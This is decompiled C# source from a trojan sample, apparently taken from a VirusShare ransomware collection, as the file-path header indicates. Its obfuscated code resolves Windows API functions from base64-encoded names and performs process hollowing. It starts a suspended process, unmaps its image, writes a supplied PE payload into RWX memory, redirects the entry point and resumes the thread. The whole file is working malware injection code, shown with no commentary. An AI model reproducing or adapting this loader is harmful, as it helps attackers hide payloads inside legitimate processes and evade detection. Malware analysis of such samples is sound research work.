// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 4a5c2017-21d9-4074-b899-32a29b0f3c26, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0A04E507-2FF2-4D9E-ACC3-5B6E2C54765E
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-a2dcc8321dba5ad48f0b385f3c7883ebaa9f53591488c132ead66b3d626d69c2.exe

using \u0007;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0006
{
  internal sealed class \u0006
  {
    [DllImport("kernel32", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr \u0003([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr \u0003([In] IntPtr obj0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static T \u0003<T>([In] string obj0, [In] string obj1)
    {
      try
      {
        return (T) Marshal.GetDelegateForFunctionPointer(\u0006.\u0006.\u0003(\u0006.\u0006.\u0003(ref obj0), ref obj1), typeof (T));
      }
      catch (Exception ex)
      {
        T obj;
        // ISSUE: variable of a boxed type
        __Boxed<T> local = (object) obj;
        string str1 = obj0;
        string str2 = obj1;
        throw UnhandledException.\u0003(ex, (object) local, (object) str1, (object) str2);
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static bool \u0003([In] byte[] obj0, [In] string obj1)
    {
      \u0006.\u0006.\u0001 obj2;
      \u0006.\u0006.\u0007 obj3;
      \u0006.\u0006.\u0003 obj4;
      \u0006.\u0006.\u0004 obj5;
      \u0006.\u0006.\u0002 obj6;
      \u0006.\u0006.\u0008 obj7;
      \u0006.\u0006.\u0006 obj8;
      \u0006.\u0006.\u0005 obj9;
      IntPtr zero1;
      IntPtr[] poegrpgaokukwhbc;
      byte[] fjplrhicndhdizglrwr;
      int int32_1;
      int int16;
      IntPtr gobjshapdwhffjwrqj;
      uint[] numArray1;
      IntPtr iesuuhchynegvvzlqz;
      IntPtr zero2;
      IntPtr kgvischhvgphidni;
      IntPtr zero3;
      IntPtr num1;
      IntPtr num2;
      IntPtr dvjxepuaeohgthdhpei;
      int int32_2;
      int sfztruhrredwfadfexn;
      int num3;
      int num4;
      int num5;
      int[] dst;
      byte[] numArray2;
      bool flag;
      try
      {
        obj2 = \u0006.\u0006.\u0003<\u0006.\u0006.\u0001>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(117918))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(117946))));
        obj3 = \u0006.\u0006.\u0003<\u0006.\u0006.\u0007>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(117990))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(118018))));
        obj4 = \u0006.\u0006.\u0003<\u0006.\u0006.\u0003>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(118070))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(118098))));
        obj5 = \u0006.\u0006.\u0003<\u0006.\u0006.\u0004>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(118150))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(118178))));
        obj6 = \u0006.\u0006.\u0003<\u0006.\u0006.\u0002>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(118222))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(118250))));
        obj7 = \u0006.\u0006.\u0003<\u0006.\u0006.\u0008>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(118302))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(118330))));
        obj8 = \u0006.\u0006.\u0003<\u0006.\u0006.\u0006>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(118382))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(118410))));
        obj9 = \u0006.\u0006.\u0003<\u0006.\u0006.\u0005>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(118446))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0003(118466))));
        try
        {
          zero1 = IntPtr.Zero;
          poegrpgaokukwhbc = new IntPtr[4];
          fjplrhicndhdizglrwr = new byte[68];
          int32_1 = BitConverter.ToInt32(obj0, 60);
          int16 = (int) BitConverter.ToInt16(obj0, checked (int32_1 + 6));
          gobjshapdwhffjwrqj = new IntPtr(BitConverter.ToInt32(obj0, checked (int32_1 + 84)));
          if (obj2((string) null, new StringBuilder(obj1), zero1, zero1, false, 4, zero1, (string) null, fjplrhicndhdizglrwr, poegrpgaokukwhbc))
          {
            numArray1 = new uint[179];
            numArray1[0] = 65538U;
            if (obj3(poegrpgaokukwhbc[1], numArray1))
            {
              iesuuhchynegvvzlqz = new IntPtr(checked ((long) numArray1[41] + 8L));
              zero2 = IntPtr.Zero;
              kgvischhvgphidni = new IntPtr(4);
              zero3 = IntPtr.Zero;
              if (obj4(poegrpgaokukwhbc[0], iesuuhchynegvvzlqz, ref zero2, (int) kgvischhvgphidni, ref zero3) && obj9(poegrpgaokukwhbc[0], zero2) == 0U)
              {
                num1 = new IntPtr(BitConverter.ToInt32(obj0, checked (int32_1 + 52)));
                num2 = new IntPtr(BitConverter.ToInt32(obj0, checked (int32_1 + 80)));
                dvjxepuaeohgthdhpei = obj5(poegrpgaokukwhbc[0], num1, num2, 12288, 64);
                int32_2 = dvjxepuaeohgthdhpei.ToInt32();
                int num6 = obj6(poegrpgaokukwhbc[0], dvjxepuaeohgthdhpei, obj0, checked ((uint) (int) gobjshapdwhffjwrqj), sfztruhrredwfadfexn) ? 1 : 0;
                num3 = checked (int16 - 1);
                num4 = num3;
                num5 = 0;
                while (num5 <= num4)
                {
                  dst = new int[10];
                  Buffer.BlockCopy((Array) obj0, checked (int32_1 + 248 + num5 * 40), (Array) dst, 0, 40);
                  numArray2 = new byte[checked (dst[4] - 1 + 1)];
                  Buffer.BlockCopy((Array) obj0, dst[5], (Array) numArray2, 0, numArray2.Length);
                  num2 = new IntPtr(checked (int32_2 + dst[3]));
                  num1 = new IntPtr(numArray2.Length);
                  int num7 = obj6(poegrpgaokukwhbc[0], num2, numArray2, checked ((uint) (int) num1), sfztruhrredwfadfexn) ? 1 : 0;
                  checked { ++num5; }
                }
                num2 = new IntPtr(checked ((long) numArray1[41] + 8L));
                num1 = new IntPtr(4);
                int num8 = obj6(poegrpgaokukwhbc[0], num2, BitConverter.GetBytes(dvjxepuaeohgthdhpei.ToInt32()), checked ((uint) (int) num1), sfztruhrredwfadfexn) ? 1 : 0;
                numArray1[44] = checked ((uint) (dvjxepuaeohgthdhpei.ToInt32() + BitConverter.ToInt32(obj0, int32_1 + 40)));
                int num9 = obj7(poegrpgaokukwhbc[1], numArray1) ? 1 : 0;
              }
            }
            int num10 = (int) obj8(poegrpgaokukwhbc[1]);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          flag = false;
          ProjectData.ClearProjectError();
          goto label_11;
        }
        return true;
label_11:
        return flag;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[32]
        {
          (object) obj6,
          (object) flag,
          (object) obj4,
          (object) obj8,
          (object) obj9,
          (object) obj2,
          (object) obj7,
          (object) obj5,
          (object) obj3,
          (object) int32_1,
          (object) poegrpgaokukwhbc,
          (object) fjplrhicndhdizglrwr,
          (object) zero1,
          (object) int16,
          (object) gobjshapdwhffjwrqj,
          (object) numArray1,
          (object) iesuuhchynegvvzlqz,
          (object) zero3,
          (object) kgvischhvgphidni,
          (object) zero2,
          (object) num1,
          (object) dvjxepuaeohgthdhpei,
          (object) sfztruhrredwfadfexn,
          (object) num2,
          (object) int32_2,
          (object) num3,
          (object) numArray2,
          (object) num5,
          (object) dst,
          (object) num4,
          (object) obj0,
          (object) obj1
        };
        throw UnhandledException.\u0003(ex, objArray);
      }
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0001(
      string ietrditgqlkybeccz,
      StringBuilder gisswaffbyrczcjbek,
      IntPtr tddvzyuanpptiley,
      IntPtr ycqlhnopsrfcrqntkq,
      [MarshalAs(UnmanagedType.Bool)] bool eaujxngrghxreezr,
      int jagdrflhlgcppngkw,
      IntPtr qftzyqcyyhqalvcldis,
      string bvdqwpklthusqazhws,
      byte[] fjplrhicndhdizglrwr,
      IntPtr[] poegrpgaokukwhbc);

    public delegate bool \u0002(
      IntPtr hiknaiiqyqcrskcd,
      IntPtr dvjxepuaeohgthdhpei,
      byte[] rayhtovktvtpnqsprofv,
      uint gobjshapdwhffjwrqj,
      int sfztruhrredwfadfexn);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0003(
      IntPtr hpjvxhftkugsddeoaxrv,
      IntPtr iesuuhchynegvvzlqz,
      ref IntPtr aanqiibdlcdgsyaiuthg,
      int kgvischhvgphidni,
      ref IntPtr tnieryiajydgnfah);

    public delegate IntPtr \u0004(
      IntPtr ptxvzenhfiyxjrukuiaa,
      IntPtr gwsrduhhhelsotxpp,
      IntPtr wscnyxncgrtvlwsjy,
      int oykcpqvtqoonaicn,
      int bsgijtjjdskoknjpk);

    public delegate uint \u0005(IntPtr pchcqqapnkhkylpkukd, IntPtr pbqsnhkivlaqctbphk);

    public delegate uint \u0006(IntPtr lcelxaicxuenriantqju);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0007(IntPtr roayflzfrbzsjwfviu, uint[] gxhyqcduubsjikzqk);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0008(IntPtr fxhcxwrwbwnndyrzoofq, uint[] idtsddwgyflpctwdc);
  }
}
